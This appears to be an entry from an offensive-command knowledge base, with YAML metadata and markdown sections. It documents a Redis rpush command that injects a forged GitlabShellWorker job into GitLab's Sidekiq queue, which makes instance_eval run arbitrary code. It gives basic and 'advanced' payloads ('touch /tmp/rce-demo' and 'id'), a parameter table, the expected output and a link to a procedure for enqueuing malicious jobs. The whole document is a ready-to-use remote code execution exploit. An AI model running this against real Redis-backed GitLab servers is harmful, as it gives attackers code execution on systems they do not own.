---
id: cmd-rpush-gitlab-job
data: >-
  rpush 'resque:gitlab:queue:gitlab_shell'
  '{"class":"GitlabShellWorker","args":["instance_eval","`touch
  /tmp/rce-demo`"],"jid":"Zaep6UXu","enqueued_at":1493166403.21}'
tags:
  - redis
  - rce
  - sidekiq
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:19.476Z'
verified: false
validated: true
submitted: true
---
# rpush-gitlab-shell-job

## Command

```bash
rpush 'resque:gitlab:queue:gitlab_shell' '{"class":"GitlabShellWorker","args":["instance_eval","`touch /tmp/rce-demo`"],"jid":"Zaep6UXu","enqueued_at":1493166403.21}'
```

## Description

Appends a malicious job payload to the GitLab Sidekiq queue in Redis, exploiting GitlabShellWorker to execute arbitrary Ruby code via instance_eval. Used within Redis CLI after connection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `key` | Queue key ('resque:gitlab:queue:gitlab_shell') | Yes |
| `payload` | JSON string with class, args (method and code), jid, enqueued_at | Yes |

## Examples

### Basic Usage

```bash
rpush 'resque:gitlab:queue:gitlab_shell' '{"class":"GitlabShellWorker","args":["instance_eval","`touch /tmp/rce-demo`"],"jid":"Zaep6UXu","enqueued_at":1493166403.21}'
```

### Advanced Usage

```bash
rpush 'resque:gitlab:queue:gitlab_shell' '{"class":"GitlabShellWorker","args":["instance_eval","`id`"],"jid":"test123","enqueued_at":1493166403.21}'
```

## Expected Output

Returns the new length of the list (e.g., `(integer) 1`). The job is processed asynchronously by Sidekiq.

## Related

- [[commands/redis-cli-connect]]
- [[procedures/Enqueue-Malicious-GitLab-Sidekiq-Job]]
